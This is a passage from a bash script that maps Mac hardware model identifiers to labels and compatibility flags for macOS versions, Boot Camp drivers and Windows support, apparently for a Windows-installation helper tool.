M1CPU="M1"
fi


if [[ $modelbb = "Mac14,12" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-23Mini"
fi

if [[ $modelbb = "Mac14,3" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-23Mini"
fi

if [[ $modelbb = "Mac14,10" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-16-inch-23Pro"
fi

if [[ $modelbb = "Mac14,6" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-16-inch-23Pro"
fi

if [[ $modelbb = "Mac14,9" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-14-inch-23Pro"
fi
	
if [[ $modelbb = "Mac14,5" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-14-inch-23Pro"
fi
	
if [[ $modelbb = "Mac14,7" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-13-inch-22Pro"
fi

if [[ $modelbb = "Mac14,2" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-13-inch-22Air"
fi
	
if [[ $modelbb = "Mac13,1" ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="Mac-Studio-2022"
	
	fi
if [[ $modelbb = "Mac13,2" ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="Mac-Studio-2022"
	
	fi		
if [[ $modelbb = *"Macmini9,1"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-20Mini"
	
	fi
	
if [[ $modelbb = *"MacBookPro17,1"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-13-inch-20Pro"
		
	fi
	
if [[ $modelbb = *"MacBookPro18,1"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-16-inch-21Pro"
		
fi	
	
if [[ $modelbb = *"MacBookPro18,2"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-16-inch-21Pro"
		
	fi
if [[ $modelbb = *"MacBookPro18,3"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-14-inch-21Pro"
		
fi	
if [[ $modelbb = *"MacBookPro18,4"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-14-inch-21Pro"
		
fi		
if [[ $modelbb = *"iMac21,1"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-24-inch-21iMac"
	fi
	
if [[ $modelbb = *"iMac21,2"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-24-inch-21iMac"
	fi	
	
if [[ $modelbb = *"MacBookAir10,1"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-13-inch-20Air"
	fi

if [[ $modelbb = "Xserve1,1" ]]; then
		echo
		dnjx="06Xserve"
		Win732="1"
		zzc32="1"
		zgmac="10.7"
		dnos="10.7.5"
	fi

if [[ $modelbb = "Xserve2,1" ]]; then
		echo
		dnjx="08Xserve"
		Win732="1"
		zgmac="10.7"
		dnos="10.7.5"
	fi

if [[ $modelbb = "Xserve3,1" ]]; then
		echo
		dnjx="09Xserve"
		Win732="1"
		zgmac="10.11"		
		dnos="10.11.6"
	fi
		
if [[ $modelbb = "MacPro1,1" ]]; then
		echo
		dnjx="06MacPro"
		Win732="1"
		zzc32="1"
		zgmac="10.7"
		dnos="10.7.5"
	fi	
	
if [[ $modelbb = "MacPro2,1" ]]; then
		echo
		dnjx="07MacPro"
		Win732="1"
		zzc32="1"
		zgmac="10.7"
		dnos="10.7.5"
	fi
		
if [[ $modelbb = "MacPro3,1" ]]; then
		echo
		dnjx="08MacPro"
		zgmac="10.11"
		dnos="10.11.6"
	fi	
	
if [[ $modelbb = "MacPro4,1" ]]; then
btap="5.1.5621"
oldsz="1"
MBR10="1"
win10sip="1"
		echo
		dnjx="09MacPro"
		dnos="10.11.6"	
		zgmac="10.11"
	fi
	
if [[ $modelbb = "MacPro5,1" ]]; then
btap="5.1.5621"
oldsz="1"
No732="1"
win10sip="1"
wzhfxt="6135"
MBR10="1"
		echo
		dnjx="10/12MacPro"
		dnos="10.12.6"		
	fi
		
if [[ $modelbb = "MacPro6,1" ]]; then
btap="5.1.5640"
wzhfxt="6136"
		echo
		dnjx="13MacPro"
		dnos="12.x.x"
	fi
		
if [[ $modelbb = "MacPro7,1" ]]; then
T2XP="1"
wzhfxt="7667"
		echo
		dnjx="19MacPro"
	fi
		
			
		if [[ $modelbb = *"MacBookAir9,1"* ]]; then
		NoWin7="1"
		T2XP="1"
		bt7="1"
		wzhfxt="7854"
		echo
		dnjx="13-inch-20Air"
		
	fi
	
			if [[ $modelbb = *"MacBookAir8,2"* ]]; then
			NoWin7="1"
			T2XP="1"
			bt7="1"
			zdbt="18air"
			wzhfxt="7242"
			wzwim="1"
		echo
		dnjx="13-inch-19Air"
		
	fi
	
				if [[ $modelbb = *"MacBookAir8,1"* ]]; then
				NoWin7="1"
				T2XP="1"
				bt7="1"
				zdbt="18air"
				wzhfxt="7242"
				wzwim="1"
		echo
		dnjx="13-inch-18Air"
		
	fi
	
					if [[ $modelbb = *"MacBookAir7,2"* ]]; then
					btap="15EFI"
					NoWin7="1"
					zgmac="12.0"
					wzhfxt="6136"
				    if [ "$pcissd" ]; then
					wzhfxt="6137"
					fi
					if [[ $model512 = "4096 Bytes" ]]; then
					wzhfxt="6138"
			     	fi
		echo
		dnjx="13-inch-15/17Air"
		dnos="12.x.x"		
	fi
	
					if [[ $modelbb = *"MacBookAir7,1"* ]]; then
					NoWin7="1"
					zgmac="12.0"
					wzhfxt="6138"
					if [ "$pcissd" ]; then
					wzhfxt="6137"
					fi
					if [[ $model512 = "512 Bytes" ]]; then
					wzhfxt="6136"
			     	fi
		echo
		dnjx="11-inch-15Air"
		dnos="12.x.x"		
	fi
	
						if [[ $modelbb = *"MacBookAir6,2"* ]]; then
						btap="5.1.5640"
						zgmac="11.0"
						No732="1"
						wzhfxt="6136"
						wzhfxt7="5640"
		echo
		dnjx="13-inch-13/14Air"
		dnos="11.x.x"
		
	fi
	
						if [[ $modelbb = *"MacBookAir6,1"* ]]; then
						btap="5.1.5640"
						zgmac="11.0"
						No732="1"
						wzhfxt="6136"
						wzhfxt7="5640"
		echo
		dnjx="11-inch-13/14Air"
		dnos="11.x.x"
		
	fi
	
						if [[ $modelbb = *"MacBookAir5,2"* ]]; then
						btap="4.0.4326"
						if [ "$sip" ]; then
						asip="1"
                        w10btap="2012Air"
	                    else
	                    w10btap="6.0.6136"
                        fi
						win10sip="1"
						zgmac="10.15"
						MBR10="1"
						oldsz="1"
						wzhfxt="6135"
						wzhfxt7="5621"
						wzhfxt732="4036"
		echo
		dnjx="13-inch-12Air"
		dnos="10.15.7"
		
	fi
	
						if [[ $modelbb = *"MacBookAir5,1"* ]]; then
						btap="4.0.4326"
						if [ "$sip" ]; then
						asip="1"
                        w10btap="2012Air"
	                    else
	                    w10btap="6.0.6136"
                        fi
                        win10sip="1"
                        zgmac="10.15"
                        MBR10="1"
                        kyqs15="1"
                        oldsz="1"
                        wzhfxt="6135"
                        wzhfxt7="5621"
                        wzhfxt732="4036"
		echo
		dnjx="11-inch-12Air"
		dnos="10.15.7"
		
	fi
		
						if [[ $modelbb = *"MacBookAir4,2"* ]]; then
						btap="4.0.4131"
						win10sip="1"
						zgmac="10.13"
						MBR10="1"
						kyqs15="1"
						wzhfxt="6135"
						wzhfxt7="5623"
						wzhfxt732="4036"
						if [ "$sip" ]; then
						asip="1"
						fi
		echo
		dnjx="13-inch-11Air"
		dnos="10.13.6"
		
	fi
		
						if [[ $modelbb = *"MacBookAir4,1"* ]]; then
						btap="4.0.4131"
						win10sip="1"
						zgmac="10.13"
						MBR10="1"
						kyqs15="1"
						wzhfxt="6135"
						wzhfxt7="5623"
						wzhfxt732="4036"
						if [ "$sip" ]; then
						asip="1"
						fi
		echo
		dnjx="11-inch-11Air"
		dnos="10.13.6"
		
	fi
			
						if [[ $modelbb = *"MacBookAir3,2"* ]]; then
						zgmac="10.13"
						MBR10="1"
						kyqs15="1"
						win10sip="1"
						wzhfxt7="4034"
						wzhfxt732="4036"
						if [ "$sip" ]; then
						asip="1"
						fi
		echo
		dnjx="13-inch-10Air"
		dnos="10.13.6"
		
	fi
				
						if [[ $modelbb = *"MacBookAir3,1"* ]]; then
						zgmac="10.13"
						MBR10="1"
						kyqs15="1"
						win10sip="1"
						wzhfxt7="4034"
						wzhfxt732="4036"
						if [ "$sip" ]; then
						asip="1"
						fi
		echo
		dnjx="11-inch-10Air"
		dnos="10.13.6"
		
	fi
					
						if [[ $modelbb = *"MacBookAir2,1"* ]]; then
						zgmac="10.11"
						MBR10="1"
						kyqs15="1"
						win10sip="1"
						Win732="1"
						wzhfxt7="4034"
						wzhfxt732="4036"
						if [ "$sip" ]; then
						asip="1"
						fi
		echo
		dnjx="13-inch-09Air"
		dnos="10.11.6"
		
	fi
						
						if [[ $modelbb = *"MacBookAir1,1"* ]]; then
						zgmac="10.7"
						MBR10="1"
						Win732="1"
						wzhfxt7="4034"
						wzhfxt732="4036"
						zzc32="1"
		echo
		dnjx="13-inch-08Air"
		dnos="10.7.5"
		
	fi						
						if [[ $modelbb = *"MacBook10,1"* ]]; then
						NoWin7="1"
						lanya="1"
						wzhfxt="6813"
						wzwim="1"
						sdqh="1"
		echo
		dnjx="17MacBook"
		dnos="13.x.x"
	fi
							if [[ $modelbb = *"MacBook9,1"* ]]; then
							NoWin7="1"
							EFI8="1"
							zgmac="12.0"
							wzhfxt="6471"
		echo
		dnjx="16MacBook"
		dnos="12.x.x"		
	fi
								if [[ $modelbb = *"MacBook8,1"* ]]; then
								NoWin7="1"
								zgmac="11.0"
								EFI8="1"
								lanya15="1"
								wzhfxt="6138"
							    if [[ $model512 = "512 Bytes" ]]; then
					            wzhfxt="6136"
			     	            fi
		echo
		dnjx="15MacBook"
		dnos="11.x.x"
		
	fi
									if [[ $modelbb = *"MacBook7,1"* ]]; then
									zgmac="10.13"
									MBR10="1"
									kyqs15="1"
									win10sip="1"
									oldsz="1"
									wzhfxt="6135"
									wzhfxt7="4034"
									wzhfxt732="4036"
		echo
		dnjx="10MacBook"
		dnos="10.13.6"
		
	fi
										if [[ $modelbb = *"MacBook6,1"* ]]; then
										zgmac="10.13"
										MBR10="1"
										kyqs15="1"
										win10sip="1"
                                        wzhfxt7="4034"
                                        wzhfxt732="4036"
		echo
		dnjx="09MacBook"
		dnos="10.13.6"
		
	fi
											if [[ $modelbb = *"MacBook5,2"* ]]; then
											zgmac="10.11"
											MBR10="1"
											kyqs15="1"
											win10sip="1"
											Win732="1"
											wzhfxt7="4034"
											wzhfxt732="4036"
		echo
		dnjx="09MacBook"
		dnos="10.11.6"
		
	fi
											if [[ $modelbb = *"MacBook5,1"* ]]; then
											zgmac="10.11"
											MBR10="1"
											win10sip="1"
											Win732="1"
											wzhfxt7="4034"
											wzhfxt732="4036"
		echo
		dnjx="08MacBook"
		dnos="10.11.6"
		
	fi	
											if [[ $modelbb = *"MacBook4,1"* ]]; then
											zgmac="10.7"
											MBR10="1"
											Win732="1"
											wzhfxt7="4034"
											wzhfxt732="4036"
		echo
		dnjx="08MacBook"
		dnos="10.7.5"
		
	fi	
	
											if [[ $modelbb = *"MacBook3,1"* ]]; then
											zgmac="10.7"
											MBR10="1"
											Win732="1"
											wzhfxt7="4034"
											wzhfxt732="4036"
											zzc32="1"
		echo
		dnjx="07MacBook"
		dnos="10.7.5"
		
	fi		
	
											if [[ $modelbb = *"MacBook2,1"* ]]; then
											zgmac="10.7"
											MBR10="1"
											Win732="1"
											wzhfxt7="4034"
											wzhfxt732="4036"
											zzc32="1"
		echo
		dnjx="06-07MacBook"
		dnos="10.7.5"
		
	fi	
	
											if [[ $modelbb = *"MacBook1,1"* ]]; then
											zgmac="10.6"
											MBR10="1"
											Win732="1"
											wzhfxt7="4034"
											wzhfxt732="4036"
											zzc32="1"
		echo
		dnjx="MacBook"
		dnos="10.6.8"
		
	fi
	
											   if [[ $modelbb = *"MacBookPro16,3"* ]]; then
											   NoWin7="1"
											   SddWin10="1"
											   T2XP="1"
											   bt7="1"
											   wzhfxt="7931"
											   xsqjc="1"
		echo
		dnjx="13-inch-20Pro"
		
	fi
			
												if [[ $modelbb = *"MacBookPro16,2"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="7931"
												xsqjc="1"
		echo
		dnjx="13-inch-20Pro"
		
	fi
												if [[ $modelbb = *"MacBookPro16,1"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="7748"
												xsqjc="1"
		echo
		dnjx="16-inch-19Pro[5300/5500M]"
		
	fi
			
												if [[ $modelbb = *"MacBookPro16,4"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="8034"
												xsqjc="1"
		echo
		dnjx="16-inch-19Pro[5600M]"
		
	fi
				
												if [[ $modelbb = *"MacBookPro15,4"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="7577"
												xsqjc="1"
		echo
		dnjx="13-inch-19Pro[Two]"
		
	fi
					
												if [[ $modelbb = *"MacBookPro15,3"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="7071"
												xsqjc="1"
		echo
		dnjx="15-inch-19Pro"
		
	fi
						
												if [[ $modelbb = *"MacBookPro15,2"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="7072"
												xsqjc="1"
		echo
		dnjx="13-inch-18/19Pro"
		
	fi
							
												if [[ $modelbb = *"MacBookPro15,1"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="7071"
												xsqjc="1"
		echo
		dnjx="15-inch-18Pro"
		
	fi
								
												if [[ $modelbb = *"MacBookPro14,3"* ]]; then
												NoWin7="1"
												SddWin10="1"
												lanya="1"
												wzhfxt="6851"
												sdqh="1"
												xsqjc="1"
		echo
		dnjx="15-inch-17Pro"
		dnos="13.x.x"
	fi
									
												if [[ $modelbb = *"MacBookPro14,2"* ]]; then
												NoWin7="1"
												SddWin10="1"
												lanya="1"
												wzhfxt="6813"
												wzwim="1"
												sdqh="1"
												xsqjc="1"
												if [[ $model512 = "512 Bytes" ]]; then
												wzhfxt="6814"
												wzwim=""
												fi
		echo
		dnjx="13-inch-17Pro"
		dnos="13.x.x"
	fi
										
												if [[ $modelbb = *"MacBookPro14,1"* ]]; then
												NoWin7="1"
												SddWin10="1"
												lanya="1"
												wzhfxt="6813"
												wzwim="1"
												sdqh="1"
												xsqjc="1"
												if [[ $model512 = "512 Bytes" ]]; then
												wzhfxt="6814"
												wzwim=""
												fi
		echo
		dnjx="13-inch-17Pro"
		dnos="13.x.x"
	fi
											
												if [[ $modelbb = *"MacBookPro13,3"* ]]; then
												NoWin7="1"
												SddWin10="1"
												lanya="1"
												wf16="1"
												zgmac="12.0"
												wzhfxt="6655"
												sdqh="1"
												xsqjc="1"
		echo
		dnjx="15-inch-16Pro"
		dnos="12.x.x"		
	fi
											
												if [[ $modelbb = *"MacBookPro13,2"* ]]; then
												NoWin7="1"
												SddWin10="1"
												lanya="1"
												wf16="1"
												zgmac="12.0"
												wzhfxt="6660"
												sdqh="1"
												xsqjc="1"
		echo
		dnjx="13-inch-16Pro"
		dnos="12.x.x"		
	fi
												
												if [[ $modelbb = *"MacBookPro13,1"* ]]; then
												NoWin7="1"
												SddWin10="1"
												lanya="1"
												wf16="1"
												zgmac="12.0"
												wzhfxt="6660"
												sdqh="1"
												xsqjc="1"
		echo
		dnjx="13-inch-16Pro"
		dnos="12.x.x"		
	fi
													
												if [[ $modelbb = *"MacBookPro11,4"* ]]; then
												NoWin7="1"
												SddWin10="1"
												btap="15EFI"
												EFI8="1"
												zgmac="12.0"
												wzhfxt="6136"
												amdbb=$(echo "$modelid" | grep 'AMD')
	                                            if [ "$amdbb" ]; then
	                                            wzhfxt="6133"
	                                            fi
	                                            if [[ $model512 = "4096 Bytes" ]]; then
												wzhfxt="6138"
												fi
												xsqjc="1"
		echo
		dnjx="15-inch-15Pro"
		dnos="12.x.x"		
	fi
														
												if [[ $modelbb = *"MacBookPro11,5"* ]]; then
												NoWin7="1"
												SddWin10="1"
												EFI8="1"
												zgmac="12.0"
												wzhfxt="6136"
												amdbb=$(echo "$modelid" | grep 'AMD')
	                                            if [ "$amdbb" ]; then
	                                            wzhfxt="6133"
	                                            fi
	                                            if [[ $model512 = "4096 Bytes" ]]; then
												wzhfxt="6138"
												fi
												xsqjc="1"
		echo
		dnjx="15-inch-15Pro"
		dnos="12.x.x"		
	fi
															
												if [[ $modelbb = *"MacBookPro12,1"* ]]; then
												NoWin7="1"
												SddWin10="1"
												btap="15EFI"
												EFI8="1"
												zgmac="12.0"
												wzhfxt="6136"
												if [[ $model512 = "4096 Bytes" ]]; then
												wzhfxt="6138"
												fi
												xsqjc="1"
		echo
		dnjx="13-inch-15Pro"
		dnos="12.x.x"		
	fi
																
												if [[ $modelbb = *"MacBookPro11,2"* ]]; then
												btap="5.1.5640"
												SddWin10="1"
												zgmac="11.0"
												No732="1"
												wzhfxt="6136"
												if [ "$pcissd" ]; then
					                            wzhfxt="6137"
					                            fi
					                            if [[ $model512 = "4096 Bytes" ]]; then
												wzhfxt="6138"
												fi
												wzhfxt7="5640"
												xsqjc="1"
		echo
		dnjx="15-inch-13/14Pro"
		dnos="11.x.x"
		
	fi
																
												if [[ $modelbb = *"MacBookPro11,3"* ]]; then
												btap="5.1.5640"
												SddWin10="1"
												zgmac="11.0"
												No732="1"
												wzhfxt="6136"
												if [ "$pcissd" ]; then
					                            wzhfxt="6137"
					                            fi
					                            if [[ $model512 = "4096 Bytes" ]]; then
												wzhfxt="6138"
												fi
												wzhfxt7="5640"
												xsqjc="1"
		echo
		dnjx="15-inch-13/14Pro"
		dnos="11.x.x"
		
	fi
																	
												if [[ $modelbb = *"MacBookPro11,1"* ]]; then
												btap="5.1.5640"
												SddWin10="1"
												zgmac="11.0"
												No732="1"
												wzhfxt="6136"
												if [ "$pcissd" ]; then
					                            wzhfxt="6137"
					                            fi
					                            if [[ $model512 = "4096 Bytes" ]]; then
												wzhfxt="6138"
												fi
												wzhfxt7="5640"
												xsqjc="1"
		echo
		dnjx="13-inch-13/14Pro"
		dnos="11.x.x"
		
	fi
																		
												if [[ $modelbb = *"MacBookPro10,2"* ]]; then
												btap="4.1.4586"
												w10btap="6.0.6136"
												win10sip="1"
												zgmac="10.15"
												MBR10="1"
												oldsz="1"
												No732="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												xsqjc="1"
		echo
		dnjx="13-inch-12/13Pro"
		dnos="10.15.7"
		
	fi
																			
												if [[ $modelbb = *"MacBookPro10,1"* ]]; then
												btap="4.0.4326"
												w10btap="6.0.6136"
												win10sip="1"
												xkm="1"
												zgmac="10.15"
												MBR10="1"
												oldsz="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												wzhfxt732="4036"
												xsqjc="1"
												nkqd="1"
		echo
		dnjx="15-inch-12/13Pro"
		dnos="10.15.7"
		
	fi
																				
												if [[ $modelbb = *"MacBookPro9,1"* ]]; then
												btap="4.0.4255"
												w10btap="6.0.6136"
												win10sip="1"
												xkm="1"
												zgmac="10.15"
												MBR10="1"
												oldsz="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												wzhfxt732="4036"
												nkqd="1"
		echo
		dnjx="15-inch-12Pro"
		dnos="10.15.7"
		
	fi
																				
												if [[ $modelbb = *"MacBookPro9,2"* ]]; then
												btap="4.0.4255"
												w10btap="6.0.6136"
												win10sip="1"
												zgmac="10.15"
												MBR10="1"
												oldsz="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												wzhfxt732="4036"
		echo
		dnjx="13-inch-12Pro"
		dnos="10.15.7"
		
	fi	
																					
												if [[ $modelbb = *"MacBookPro8,3"* ]]; then
												win10sip="1"
												xkm="1"
												zgmac="10.13"
												MBR10="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												wzhfxt732="4036"
		echo
		dnjx="17-inch-11Pro"
		dnos="10.13.6"
		
	fi	
																					
												if [[ $modelbb = *"MacBookPro8,2"* ]]; then
												win10sip="1"
												xkm="1"
												zgmac="10.13"
												MBR10="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												wzhfxt732="4036"
		echo
		dnjx="15-inch-11Pro"
		dnos="10.13.6"
		
	fi	
																					
												if [[ $modelbb = *"MacBookPro8,1"* ]]; then
												win10sip="1"
												zgmac="10.13"
												MBR10="1"
												kyqs15="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												wzhfxt732="4036"
		echo
		dnjx="13-inch-11Pro"
		dnos="10.13.6"
		
	fi	
																						
												if [[ $modelbb = *"MacBookPro7,1"* ]]; then
												zgmac="10.13"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt="6135"
									            wzhfxt7="4034"
									            wzhfxt732="4036"
		echo
		dnjx="13-inch-10Pro"
		dnos="10.13.6"
		
	fi	
																					
												if [[ $modelbb = *"MacBookPro6,2"* ]]; then
												zgmac="10.13"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="15-inch-10Pro"
		dnos="10.13.6"
		
	fi	
																						
												if [[ $modelbb = *"MacBookPro6,1"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="17-inch-10Pro"
		dnos="10.11.6"
		
	fi	
																							
												if [[ $modelbb = *"MacBookPro5,5"* ]]; then
												zgmac="10.11"
												MBR10="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="13-inch-09Pro"
		dnos="10.11.6"
		
	fi	
	
												if [[ $modelbb = *"MacBookPro5,4"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="15-inch-09Pro"
		dnos="10.11.6"
		
	fi					
																			
												if [[ $modelbb = *"MacBookPro5,3"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="15-inch-09Pro"
		dnos="10.11.6"
		
	fi	
																																																
												if [[ $modelbb = *"MacBookPro5,2"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="17-inch-09Pro"
		dnos="10.11.6"
		
	fi	
																								
												if [[ $modelbb = *"MacBookPro5,1"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="15-inch-08Pro"
		dnos="10.11.6"
		
	fi	
																									
												if [[ $modelbb = *"MacBookPro4,1"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="15-inch/17-inch-08Pro"
		dnos="10.11.6"
		
	fi	
																									
												if [[ $modelbb = *"MacBookPro3,1"* ]]; then
												zgmac="10.11"
												MBR10="1"
												win10sip="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="15-inch/17-inch-07Pro"
		dnos="10.11.6"
		
	fi																											
																									
												if [[ $modelbb = *"MacBookPro2,1"* ]]; then
												zgmac="10.7"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="17-inch-06Pro"
		dnos="10.7.5"
		
	fi	
																									
												if [[ $modelbb = *"MacBookPro2,2"* ]]; then
												zgmac="10.7"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="15-inch-06Pro"
		dnos="10.7.5"
		
	fi
																									
												if [[ $modelbb = *"MacBookPro1,1"* ]]; then
												zgmac="10.6"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="15-inch-06Pro"
		dnos="10.6.8"
		
	fi	
																										
												if [[ $modelbb = *"MacBookPro1,2"* ]]; then
												zgmac="10.6"
												MBR10="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="17-inch-06Pro"
		dnos="10.6.8"
		
	fi	
	
												if [[ $modelbb = *"iMac20,1"* ]]; then
												NoWin7="1"
												T2XP="1"
												bt7="1"
												wzhfxt="8082"
		echo
		dnjx="27-inch-20iMac[5K]"
		
	fi	
																											
												if [[ $modelbb = *"iMac20,2"* ]]; then
												NoWin7="1"
												T2XP="1"
												bt7="1"
												wzhfxt="8082"
		echo
		dnjx="27-inch-20iMac[5k]"
		
	fi	
																												
												if [[ $modelbb = *"iMac19,2"* ]]; then
												NoWin7="1"
												iMacbb="1"
												bt7="1"
												wzhfxt="7866"
		echo
		dnjx="21.5-inch-19iMac[4K]"
		
	fi	
																													
												if [[ $modelbb = *"iMac19,1"* ]]; then
												NoWin7="1"
												iMacbb="1"
												bt7="1"
												wzhfxt="7866"
		echo
		dnjx="27-inch-19iMac[5K]"
		
	fi	
																														
												if [[ $modelbb = *"iMacPro1,1"* ]]; then
												NoWin7="1"
												T2XP="1"
												iMacbb="1"
												bt7="1"
												wzhfxt="7866"
		echo
		dnjx="27-inch-17iMacPro[5K]"
		
	fi	
																															
												if [[ $modelbb = *"iMac18,3"* ]]; then
												NoWin7="1"
												iMacbb="1"
												bt7="1"
												wzhfxt="7866"
		echo
		dnjx="27-inch-17iMac[5K]"
		dnos="13.x.x"
	fi	
																																
												if [[ $modelbb = *"iMac18,2"* ]]; then
												NoWin7="1"
												iMacbb="1"
												bt7="1"
												wzhfxt="7866"
		echo
		dnjx="21.5-inch-17iMac[4K]"
		dnos="13.x.x"
	fi	
																																	
												if [[ $modelbb = *"iMac18,1"* ]]; then
												NoWin7="1"
												iMacbb="1"
												wzhfxt="6721"
		echo
		dnjx="21.5-inch-17iMac[No4K]"
		dnos="13.x.x"
	fi	
																																		
												if [[ $modelbb = *"iMac17,1"* ]]; then
												NoWin7="1"
												iMacbb="1"
												EFI8="1"
												zgmac="12.0"
												wzhfxt="6251"
		echo
		dnjx="27-inch-15iMac[5K]"
		dnos="12.x.x"		
	fi	
																																			
												if [[ $modelbb = *"iMac16,2"* ]]; then
												NoWin7="1"
												iMacbb="1"
												EFI8="1"
												zgmac="12.0"
												wzhfxt="6251"
		echo
		dnjx="21.5-inch-15iMac[4K]"
		dnos="12.x.x"		
	fi	
																																				
												if [[ $modelbb = *"iMac16,1"* ]]; then
												NoWin7="1"
												iMacbb="1"
												EFI8="1"
												zgmac="12.0"
												wzhfxt="6251"
		echo
		dnjx="21.5-inch-15iMac"
		dnos="12.x.x"		
	fi	
																																					
												if [[ $modelbb = *"iMac15,1"* ]]; then
												btap="5.1.5769"
												iMacbb="1"
												EFI8="1"
												No732="1"
												zgmac="11.0"
												wzhfxt="6140"
		echo
		dnjx="27-inch-15/14iMac[5K]"
		dnos="11.x.x"		
	fi	
																																						
												if [[ $modelbb = *"iMac14,4"* ]]; then
												btap="5.1.5722"
												iMacbb="1"
												No732="1"
												zgmac="11.0"
												wzhfxt="6133"
		echo
		dnjx="21-inch-14iMac"
		dnos="11.x.x"		
	fi	
												if [[ $modelbb = "iMac14,3" ]]; then
												btap="5.1.5640"
												zgmac="10.15"
												iMacbb="1"
												oldsz="1"
												No732="1"
												wzhfxt="6140"
												wzhfxt7="5641"
		echo
		dnjx="21.5-inch-13iMac"
		dnos="10.15.7"
	fi																																						
												if [[ $modelbb = *"iMac14,2"* ]]; then
												btap="5.1.5640"
												zgmac="10.15"
												iMacbb="1"
												oldsz="1"
												No732="1"
												wzhfxt="6133"
		echo
		dnjx="27-inch-13iMac"
		dnos="10.15.7"
	fi	
																																								
												if [[ $modelbb = *"iMac14,1"* ]]; then
												btap="5.1.5640"
												zgmac="10.15"
												iMacbb="1"
												oldsz="1"
												No732="1"
												wzhfxt="6133"
		echo
		dnjx="21.5-inch-13iMac"
		dnos="10.15.7"
	fi	
	
												if [[ $modelbb = *"iMac13,3"* ]]; then
												btap="5.1.5621"
												w10btap="6.0.6136"
												zgmac="10.15"
												iMacbb="1"
												oldsz="1"
												No732="1"
												wzhfxt="6133"
		echo
		dnjx="21.5-inch-13iMac"
		dnos="10.15.7"
	fi
																																										
												if [[ $modelbb = "iMac13,2" ]]; then
												btap="5.1.5621"
												w10btap="6.0.6136"
												win10sip="1"
												zgmac="10.15"
												MBR10="1"
												iMacbb="1"
												oldsz="1"
												No732="1"
												wzhfxt="6135"
												wzhfxt7="5622"
												nkqd="1"
		echo
		dnjx="27-inch-12iMac"
		dnos="10.15.7"
	fi	
																																										
												if [[ $modelbb = *"iMac13,1"* ]]; then
												btap="5.1.5621"
												w10btap="6.0.6136"
												win10sip="1"
												zgmac="10.15"
												MBR10="1"
												iMacbb="1"
												oldsz="1"
												No732="1"
												wzhfxt="6135"
												nkqd="1"
		echo
		dnjx="21.5-inch-12iMac"
		dnos="10.15.7"
	fi	
																																											
												if [[ $modelbb = *"iMac12,2"* ]]; then
												btap="5.1.5621"
												win10sip="1"
												zgmac="10.13"
												MBR10="1"
												oldsz="1"
												wzhfxt="6135"
												wzhfxt7="5624"
												wzhfxt732="4036"
		echo
		dnjx="11iMac"
		dnos="10.13.6"
	fi	
																																												
